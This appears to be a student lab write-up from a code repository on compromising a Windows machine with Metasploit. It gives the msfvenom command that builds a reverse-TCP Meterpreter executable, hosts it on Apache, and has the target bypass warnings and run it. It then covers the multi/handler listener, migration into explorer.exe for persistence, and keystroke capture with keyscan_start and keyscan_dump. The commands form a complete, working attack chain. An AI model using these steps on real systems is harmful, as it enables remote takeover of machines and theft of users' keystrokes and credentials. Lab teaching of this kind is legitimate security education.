# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="809" height="301" alt="Screenshot 2026-02-13 141749" src="https://github.com/user-attachments/assets/9d623133-cf06-4e90-bbad-5d36506b4f86" />


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="874" height="145" alt="Screenshot 2026-02-13 141804" src="https://github.com/user-attachments/assets/2cf16f9a-9c5f-46a6-8719-52f78ca9fa71" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:

<img width="825" height="109" alt="image" src="https://github.com/user-attachments/assets/ce0ccf45-1287-4d74-ab89-220cf002c264" />

Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="767" height="52" alt="image" src="https://github.com/user-attachments/assets/402f5b47-8125-4b52-8ab2-77eaa0e25c4c" />


Check the status of apache2
## OUTPUT:

<img width="924" height="432" alt="image" src="https://github.com/user-attachments/assets/487b07cb-7c86-4a65-bfa2-10cdc42eccd5" />


Invoke msfconsole:
## OUTPUT:


<img width="901" height="673" alt="Screenshot 2026-02-13 141845" src="https://github.com/user-attachments/assets/50c0a6da-e766-4bfe-a2c3-139969c0e4a0" />


Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:


<img width="946" height="693" alt="Screenshot 2026-02-13 141936" src="https://github.com/user-attachments/assets/832e1748-53f4-4b8d-983c-82bb3fa78f18" />

Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
<img width="932" height="465" alt="Screenshot 2026-02-13 142024" src="https://github.com/user-attachments/assets/d0f6e3aa-5580-449d-8623-ad51394187b7" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 



Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

<img width="941" height="680" alt="Screenshot 2026-02-13 142131" src="https://github.com/user-attachments/assets/7d02933d-fd7f-4461-a1f7-90670e0e2641" />


On kali/parrot give the command exploit
## OUTPUT:


<img width="941" height="218" alt="image" src="https://github.com/user-attachments/assets/3266cbd7-84f3-41f1-80f9-ad41f5d9a075" />


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:
<img width="939" height="910" alt="image" src="https://github.com/user-attachments/assets/b671c311-fff7-46b3-bad3-ecb5f3814f7d" />



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe



at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:
<img width="948" height="971" alt="image" src="https://github.com/user-attachments/assets/d3ac5dcc-b252-4c51-b4b3-86246ad715d1" />



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
<img width="621" height="157" alt="image" src="https://github.com/user-attachments/assets/d5a48c28-c301-46c2-8960-ecf6b18a95c1" />


keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:

<img width="546" height="226" alt="image" src="https://github.com/user-attachments/assets/4c10bb36-2e57-4fae-be0a-45770fc1aaff" />

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
<img width="949" height="837" alt="image" src="https://github.com/user-attachments/assets/62740048-eb78-41fe-8f93-87131dc62781" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
